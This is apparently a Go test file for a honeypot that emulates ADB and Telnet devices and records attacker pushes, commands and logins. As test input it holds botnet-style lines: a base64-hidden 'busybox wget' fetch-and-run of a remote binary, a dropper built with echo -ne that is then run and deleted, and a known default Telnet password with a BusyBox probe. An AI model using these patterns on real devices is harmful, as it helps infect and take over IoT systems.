package session

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/generalregulator/botbait/internal/config"
	"github.com/generalregulator/botbait/internal/metrics"
	"github.com/generalregulator/botbait/internal/model"
	"github.com/generalregulator/botbait/internal/parser"
	"github.com/generalregulator/botbait/internal/payloadstore"
	"github.com/generalregulator/botbait/internal/profile"
)

func pushCfg() *config.Config {
	c := testCfg()
	c.CapturePush = true
	c.MaxPushBytes = 1 << 20
	c.PushSessionTimeout = 10 * time.Second
	c.SessionTimeout = 5 * time.Second
	c.ReadTimeout = time.Second
	return c
}

func newStore(t *testing.T) *payloadstore.Store {
	t.Helper()
	st, err := payloadstore.New(t.TempDir(), 64<<20)
	if err != nil {
		t.Fatal(err)
	}
	return st
}

func runWith(t *testing.T, cfg *config.Config, port int, opts []Option, script func(c net.Conn)) *model.Event {
	t.Helper()
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	sink := make(captureSink, 1)
	h := New(cfg, sink, &metrics.Metrics{}, opts...)
	go func() {
		c, err := ln.Accept()
		if err == nil {
			h.Handle(context.Background(), c, port)
		}
	}()
	cl, err := net.Dial("tcp", ln.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer cl.Close()
	script(cl)
	_ = cl.Close()
	select {
	case ev := <-sink:
		return ev
	case <-time.After(10 * time.Second):
		t.Fatal("session never finished")
		return nil
	}
}

type adbClient struct {
	t   *testing.T
	c   net.Conn
	buf []byte
}

func newADB(t *testing.T, c net.Conn) *adbClient {
	a := &adbClient{t: t, c: c}
	a.send("CNXN", 0x01000001, 256*1024, []byte("host::features=shell_v2,cmd\x00"))
	m := a.expect("CNXN")
	if !strings.HasPrefix(string(m.Payload), "device::ro.product.name=p212;") {
		t.Fatalf("banner: %q", m.Payload)
	}
	return a
}

func (a *adbClient) send(cmd string, a0, a1 uint32, p []byte) {
	a.t.Helper()
	if _, err := a.c.Write(parser.BuildADB(cmd, a0, a1, p)); err != nil {
		a.t.Fatalf("write %s: %v", cmd, err)
	}
}

func (a *adbClient) next() parser.ADBMessage {
	a.t.Helper()
	for {
		msgs, used, err := parser.ParseADB(a.buf, 1<<20)
		if err != nil {
			a.t.Fatalf("bad ADB from server: %v", err)
		}
		if len(msgs) > 0 {

			var rest []byte
			for _, m := range msgs[1:] {
				rest = append(rest, parser.BuildADB(m.Command, m.Arg0, m.Arg1, m.Payload)...)
			}
			a.buf = append(rest, a.buf[used:]...)
			return msgs[0]
		}
		_ = a.c.SetReadDeadline(time.Now().Add(3 * time.Second))
		tmp := make([]byte, 64<<10)
		n, err := a.c.Read(tmp)
		if n > 0 {
			a.buf = append(a.buf, tmp[:n]...)
			continue
		}
		a.t.Fatalf("waiting for ADB message: %v", err)
	}
}

func (a *adbClient) expect(cmd string) parser.ADBMessage {
	a.t.Helper()
	for i := 0; i < 64; i++ {
		m := a.next()
		if m.Command == cmd {
			return m
		}
		if m.Command != "OKAY" {
			a.t.Fatalf("expected %s, got %s %q", cmd, m.Command, m.Payload)
		}
	}
	a.t.Fatalf("never saw %s", cmd)
	return parser.ADBMessage{}
}

func (a *adbClient) open(service string) uint32 {
	a.t.Helper()
	a.send("OPEN", 1, 0, []byte(service+"\x00"))
	m := a.next()
	if m.Command != "OKAY" {
		a.t.Fatalf("open %q: got %s", service, m.Command)
	}
	return m.Arg0
}

func (a *adbClient) collect() []byte {
	a.t.Helper()
	var out []byte
	for i := 0; i < 256; i++ {
		m := a.next()
		switch m.Command {
		case "WRTE":
			out = append(out, m.Payload...)
		case "CLSE":
			return out
		}
	}
	a.t.Fatal("no CLSE")
	return nil
}

func syncReq(id string, body []byte) []byte {
	b := make([]byte, 8)
	copy(b, id)
	binary.LittleEndian.PutUint32(b[4:], uint32(len(body)))
	return append(b, body...)
}

func syncDone(mtime uint32) []byte {
	b := make([]byte, 8)
	copy(b, "DONE")
	binary.LittleEndian.PutUint32(b[4:], mtime)
	return b
}

func sha(b []byte) string { h := sha256.Sum256(b); return hex.EncodeToString(h[:]) }

func TestADBPushIsCapturedAndVisibleToShell(t *testing.T) {
	st := newStore(t)
	payload := append([]byte("\x7fELF\x01\x01\x01"), bytes.Repeat([]byte{0xCC}, 150_000)...)

	var shellOut []byte
	ev := runWith(t, pushCfg(), 5555, []Option{WithStore(st)}, func(c net.Conn) {
		a := newADB(t, c)
		id := a.open("sync:")
		a.send("WRTE", 1, id, syncReq("SEND", []byte("/data/local/tmp/bot,33261")))
		for off := 0; off < len(payload); off += 64 * 1024 {
			end := min(off+64*1024, len(payload))
			a.send("WRTE", 1, id, syncReq("DATA", payload[off:end]))
		}
		a.send("WRTE", 1, id, syncDone(1700000000))

		var ack []byte
		for len(ack) == 0 {
			if m := a.next(); m.Command == "WRTE" {
				ack = m.Payload
			}
		}
		if string(ack[:4]) != "OKAY" {
			t.Fatalf("sync ack: %q", ack)
		}

		a.send("WRTE", 1, id, syncReq("STAT", []byte("/data/local/tmp/bot")))
		var stat []byte
		for len(stat) == 0 {
			if m := a.next(); m.Command == "WRTE" {
				stat = m.Payload
			}
		}
		if string(stat[:4]) != "STAT" || binary.LittleEndian.Uint32(stat[4:]) != 33261 ||
			int(binary.LittleEndian.Uint32(stat[8:])) != len(payload) {
			t.Fatalf("STAT reply: %v", stat)
		}
		a.send("WRTE", 1, id, syncReq("QUIT", nil))
		a.expect("CLSE")

		a.open("shell:chmod 755 /data/local/tmp/bot; ls -l /data/local/tmp")
		shellOut = a.collect()
	})

	if len(ev.Dropped) != 1 {
		t.Fatalf("dropped: %+v", ev.Dropped)
	}
	d := ev.Dropped[0]
	if !d.Success || d.Via != payloadstore.SourceADBPush || d.Path != "/data/local/tmp/bot" || d.Mode != "0755" ||
		d.SHA256 != sha(payload) || d.FileType != "ELF" || !d.Executable || d.Size != int64(len(payload)) || d.Status != "Saved" {
		t.Fatalf("drop record wrong: %+v", d)
	}
	got, err := os.ReadFile(st.Path(d.Filename))
	if err != nil || !bytes.Equal(got, payload) {
		t.Fatalf("stored bytes differ: err=%v len=%d", err, len(got))
	}
	if !strings.Contains(string(shellOut), "bot") || !strings.Contains(string(shellOut), "-rwxr-xr-x") {
		t.Fatalf("pushed file not visible to the shell: %q", shellOut)
	}
	if ev.Action != "ADB shell + push" || !strings.Contains(ev.Text, "[dropped] /data/local/tmp/bot") ||
		!strings.Contains(ev.Text, "sha256="+sha(payload)) {
		t.Fatalf("event: action=%q text=%q", ev.Action, ev.Text)
	}
	if ev.BytesReceived <= pushCfg().MaxReadBytes || ev.Truncated {
		t.Fatalf("push budget not granted: received=%d truncated=%v", ev.BytesReceived, ev.Truncated)
	}
}

func TestADBPushSizeCapDiscardsAndStaysBounded(t *testing.T) {
	st := newStore(t)
	cfg := pushCfg()
	cfg.MaxPushBytes = 100 * 1024
	ev := runWith(t, cfg, 5555, []Option{WithStore(st)}, func(c net.Conn) {
		a := newADB(t, c)
		id := a.open("sync:")
		a.send("WRTE", 1, id, syncReq("SEND", []byte("/data/local/tmp/huge,33188")))
		chunk := bytes.Repeat([]byte{7}, 64*1024)
		for i := 0; i < 8; i++ {
			if _, err := c.Write(parser.BuildADB("WRTE", 1, id, syncReq("DATA", chunk))); err != nil {
				break
			}
		}
		a.c.Write(parser.BuildADB("WRTE", 1, id, syncDone(0)))
		time.Sleep(100 * time.Millisecond)
	})
	if len(ev.Dropped) != 1 || ev.Dropped[0].Success || !strings.Contains(ev.Dropped[0].Status, "Size Limit") {
		t.Fatalf("drop: %+v", ev.Dropped)
	}
	entries, _ := os.ReadDir(st.Dir())
	if len(entries) != 0 {
		t.Fatalf("oversized upload must leave nothing behind, found %d files", len(entries))
	}
	limit := cfg.MaxReadBytes + int(cfg.MaxPushBytes) + int(cfg.MaxPushBytes/256) + 64<<10
	if ev.BytesReceived > limit {
		t.Fatalf("read budget exceeded: %d > %d", ev.BytesReceived, limit)
	}
}

func TestADBPushWithoutCaptureIsRecordedNotStored(t *testing.T) {
	cfg := pushCfg()
	cfg.CapturePush = false
	ev := runWith(t, cfg, 5555, nil, func(c net.Conn) {
		a := newADB(t, c)
		id := a.open("sync:")
		a.send("WRTE", 1, id, syncReq("SEND", []byte("/data/local/tmp/x,33261")))
		a.send("WRTE", 1, id, syncReq("DATA", []byte("#!/bin/sh\necho hi\n")))
		a.send("WRTE", 1, id, syncDone(0))
		time.Sleep(100 * time.Millisecond)
	})
	if len(ev.Dropped) != 1 || ev.Dropped[0].Success || ev.Dropped[0].Status != dropDisabled || ev.Dropped[0].Size != 18 {
		t.Fatalf("drop: %+v", ev.Dropped)
	}
}

func TestADBPartialTransferIsKept(t *testing.T) {
	st := newStore(t)
	ev := runWith(t, pushCfg(), 5555, []Option{WithStore(st)}, func(c net.Conn) {
		a := newADB(t, c)
		id := a.open("sync:")
		a.send("WRTE", 1, id, syncReq("SEND", []byte("/data/local/tmp/cut,33261")))
		a.send("WRTE", 1, id, syncReq("DATA", append([]byte("\x7fELF"), bytes.Repeat([]byte{1}, 1000)...)))
		time.Sleep(50 * time.Millisecond)
		c.Close()
	})
	if len(ev.Dropped) != 1 || !ev.Dropped[0].Success || !ev.Dropped[0].Incomplete || ev.Dropped[0].Status != dropSavedPart {
		t.Fatalf("drop: %+v", ev.Dropped)
	}
}

func TestADBPushPerSessionFileLimit(t *testing.T) {
	st := newStore(t)
	ev := runWith(t, pushCfg(), 5555, []Option{WithStore(st)}, func(c net.Conn) {
		a := newADB(t, c)
		id := a.open("sync:")
		for i := 0; i < maxDrops+3; i++ {
			a.send("WRTE", 1, id, syncReq("SEND", []byte("/data/local/tmp/f"+string(rune('a'+i))+",33188")))
			a.send("WRTE", 1, id, syncReq("DATA", []byte{byte(i), 1, 2, 3}))
			a.send("WRTE", 1, id, syncDone(0))
		}
		time.Sleep(150 * time.Millisecond)
	})
	if len(ev.Dropped) != maxDrops {
		t.Fatalf("want %d records, got %d", maxDrops, len(ev.Dropped))
	}
	entries, _ := os.ReadDir(st.Dir())
	if len(entries) > 2*maxDrops {
		t.Fatalf("stored too many files: %d", len(entries))
	}
}

func TestADBSyncStatListRecv(t *testing.T) {
	ev := runWith(t, pushCfg(), 5555, nil, func(c net.Conn) {
		a := newADB(t, c)
		id := a.open("sync:")
		read := func() []byte {
			for {
				if m := a.next(); m.Command == "WRTE" {
					return m.Payload
				}
			}
		}
		a.send("WRTE", 1, id, syncReq("STAT", []byte("/nonexistent")))
		if r := read(); string(r[:4]) != "STAT" || binary.LittleEndian.Uint32(r[4:]) != 0 {
			t.Fatalf("missing STAT: %v", r)
		}
		a.send("WRTE", 1, id, syncReq("RECV", []byte("/system/build.prop")))
		var body []byte
		for {
			r := read()
			if string(r[:4]) == "DATA" {
				body = append(body, r[8:]...)
				continue
			}
			if string(r[:4]) != "DONE" {
				t.Fatalf("RECV framing: %q", r[:4])
			}
			break
		}
		if !strings.Contains(string(body), "ro.product.model=MXQ-4K") {
			t.Fatalf("pulled build.prop: %q", body)
		}
		a.send("WRTE", 1, id, syncReq("RECV", []byte("/data/nothing")))
		if r := read(); string(r[:4]) != "FAIL" || !strings.Contains(string(r[8:]), "No such file") {
			t.Fatalf("RECV missing: %q", r)
		}
		a.send("WRTE", 1, id, syncReq("LIST", []byte("/data/local")))
		var names []string
		for {
			r := read()
			if string(r[:4]) == "DENT" {
				names = append(names, string(r[20:]))
				continue
			}
			break
		}
		if len(names) != 1 || names[0] != "tmp" {
			t.Fatalf("LIST: %v", names)
		}
	})
	if ev.Action != "ADB pull (file read)" || !strings.Contains(ev.Text, "ADB pull /system/build.prop") {
		t.Fatalf("event: %q / %q", ev.Action, ev.Text)
	}
}

func TestADBShellV2Framing(t *testing.T) {
	var raw []byte
	ev := runWith(t, pushCfg(), 5555, nil, func(c net.Conn) {
		a := newADB(t, c)
		a.open("shell,v2,raw:echo hi; ls /nope")
		raw = a.collect()
	})
	var stdout, stderr string
	exit := -1
	for len(raw) >= 5 {
		n := int(binary.LittleEndian.Uint32(raw[1:5]))
		p := raw[5 : 5+n]
		switch raw[0] {
		case 1:
			stdout += string(p)
		case 2:
			stderr += string(p)
		case 3:
			exit = int(p[0])
		}
		raw = raw[5+n:]
	}
	if stdout != "hi\n" || !strings.Contains(stderr, "No such file") || exit != 1 {
		t.Fatalf("v2: stdout=%q stderr=%q exit=%d", stdout, stderr, exit)
	}
	if len(ev.Commands) != 1 || ev.Commands[0] != "echo hi; ls /nope" {
		t.Fatalf("commands: %v", ev.Commands)
	}
}

func TestADBInteractiveShell(t *testing.T) {
	var out string
	ev := runWith(t, pushCfg(), 5555, nil, func(c net.Conn) {
		a := newADB(t, c)
		id := a.open("shell:")
		read := func(want string) {
			for !strings.Contains(out, want) {
				m := a.next()
				if m.Command == "WRTE" {
					out += string(m.Payload)
				}
			}
		}
		read("root@p212:/ # ")
		a.send("WRTE", 1, id, []byte("cd /data/local/tmp\r"))
		read("root@p212:/data/local/tmp # ")
		a.send("WRTE", 1, id, []byte("getprop ro.build.version.release\r"))
		read("7.1.2\r\n")
		a.send("WRTE", 1, id, []byte("exit\r"))
		out += string(a.collect())
	})
	if !strings.Contains(out, "getprop ro.build.version.release") {
		t.Fatalf("pty must echo typed input: %q", out)
	}
	if len(ev.Commands) != 2 || ev.Commands[1] != "getprop ro.build.version.release" {
		t.Fatalf("commands: %v", ev.Commands)
	}
}

func TestADBForwardAttemptRecordedNotContacted(t *testing.T) {
	var m parser.ADBMessage
	ev := runWith(t, pushCfg(), 5555, nil, func(c net.Conn) {
		a := newADB(t, c)
		a.send("OPEN", 9, 0, []byte("tcp:8080\x00"))
		m = a.next()
	})
	if m.Command != "CLSE" || m.Arg0 != 0 || m.Arg1 != 9 {
		t.Fatalf("refusal: %+v", m)
	}
	if ev.Action != "ADB forward attempt" || !strings.Contains(ev.Text, "tcp:8080") {
		t.Fatalf("event: %q %q", ev.Action, ev.Text)
	}
}

func TestADBRootAndUnknownServices(t *testing.T) {
	runWith(t, pushCfg(), 5555, nil, func(c net.Conn) {
		a := newADB(t, c)
		a.open("root:")
		if got := string(a.collect()); !strings.Contains(got, "already running as root") {
			t.Fatalf("root: %q", got)
		}
		a.send("OPEN", 3, 0, []byte("framebuffer:\x00"))
		if m := a.next(); m.Command != "CLSE" || m.Arg0 != 0 {
			t.Fatalf("unknown service must be refused: %+v", m)
		}
	})
}

func TestShellAssembledDropperIsHarvested(t *testing.T) {
	st := newStore(t)
	ev := runWith(t, pushCfg(), 5555, []Option{WithStore(st)}, func(c net.Conn) {
		a := newADB(t, c)
		a.open(`shell:cd /data/local/tmp; echo -ne "\x7f\x45\x4c\x46\x02\x01" > .s`)
		a.collect()
		a.open(`shell:cd /data/local/tmp; echo -ne "\x01\x00\x00\x00\x00" >> .s; chmod +x .s; ./.s; rm -f .s`)
		a.collect()
	})
	want := []byte("\x7fELF\x02\x01\x01\x00\x00\x00\x00")
	if len(ev.Dropped) != 1 {
		t.Fatalf("dropped: %+v", ev.Dropped)
	}
	d := ev.Dropped[0]
	if d.Via != payloadstore.SourceShell || !d.Success || d.SHA256 != sha(want) || d.FileType != "ELF" || !d.Executable {
		t.Fatalf("drop: %+v", d)
	}
	got, _ := os.ReadFile(filepath.Join(st.Dir(), d.Filename))
	if !bytes.Equal(got, want) {
		t.Fatalf("stored %q want %q", got, want)
	}
}

func TestShellRevealsHiddenScriptURLs(t *testing.T) {
	ev := runWith(t, pushCfg(), 5555, nil, func(c net.Conn) {
		a := newADB(t, c)

		a.open("shell:echo Y2QgL2RhdGEvbG9jYWwvdG1wOyBidXN5Ym94IHdnZXQgaHR0cDovLzE5OC41MS4xMDAuNzcvaGlkZGVuLmFybSAtTyAuaDsgY2htb2QgK3ggLmgK | base64 -d | sh")
		a.collect()
	})
	if !strings.Contains(ev.Text, "[script] cd /data/local/tmp; busybox wget http://198.51.100.77/hidden.arm") {
		t.Fatalf("hidden script not exposed to analysis:\n%s", ev.Text)
	}
}

func TestTelnetUsesProfileAndShell(t *testing.T) {
	router, err := profile.Load("router-busybox", "t")
	if err != nil {
		t.Fatal(err)
	}
	cfg := pushCfg()
	var transcript string
	ev := runWith(t, cfg, 2323, []Option{WithTelnetProfile(router)}, func(c net.Conn) {
		read := func(want string) {
			t.Helper()
			buf := make([]byte, 4096)
			for !strings.Contains(transcript, want) {
				_ = c.SetReadDeadline(time.Now().Add(2 * time.Second))
				n, err := c.Read(buf)
				transcript += string(buf[:n])
				if err != nil && !strings.Contains(transcript, want) {
					t.Fatalf("waiting for %q: %v (got %q)", want, err, transcript)
				}
			}
		}
		read("Router login: ")
		c.Write([]byte("root\r\n"))
		read("Password: ")
		c.Write([]byte("vizxv\r\n"))
		read("Login incorrect")
		c.Write([]byte("admin\r\n"))
		read("Password: ")
		c.Write([]byte("admin\r\n"))
		read("BusyBox v1.22.1")
		read("# ")
		c.Write([]byte("uname -a\r\n"))
		read("mips")
		c.Write([]byte("/bin/busybox ECCHI\r\n"))
		read("ECCHI: applet not found")
		c.Write([]byte("exit\r\n"))
	})
	if strings.Contains(transcript, "vizxv") || strings.Contains(transcript, "\nadmin\r\n") && strings.Count(transcript, "admin") > 1 {
		t.Fatalf("passwords must not be echoed: %q", transcript)
	}
	if ev.Action != "Telnet shell" || len(ev.Credentials) != 2 || ev.Credentials[0].Password != "vizxv" {
		t.Fatalf("event: %+v", ev)
	}
	if len(ev.Commands) != 2 || ev.Commands[0] != "uname -a" || ev.Commands[1] != "/bin/busybox ECCHI" {
		t.Fatalf("commands: %v", ev.Commands)
	}

	if !strings.Contains(transcript, "/bin/busybox ECCHI\r\nECCHI: applet not found") {
		t.Fatalf("output must follow the echoed command on its own line: %q", transcript)
	}
}

func TestTelnetAcceptsImmediatelyWhenProfileSaysSo(t *testing.T) {
	p, _ := profile.Load("router-busybox", "t")
	p.Telnet.FailuresBeforeOK = 0
	var transcript string
	runWith(t, pushCfg(), 2323, []Option{WithTelnetProfile(p)}, func(c net.Conn) {
		buf := make([]byte, 4096)
		step := func(send, want string) {
			if send != "" {
				c.Write([]byte(send))
			}
			for !strings.Contains(transcript, want) {
				_ = c.SetReadDeadline(time.Now().Add(2 * time.Second))
				n, err := c.Read(buf)
				transcript += string(buf[:n])
				if err != nil && !strings.Contains(transcript, want) {
					t.Fatalf("waiting for %q: %v (%q)", want, err, transcript)
				}
			}
		}
		step("", "login: ")
		step("root\r\n", "Password: ")
		step("pw\r\n", "# ")
	})
}
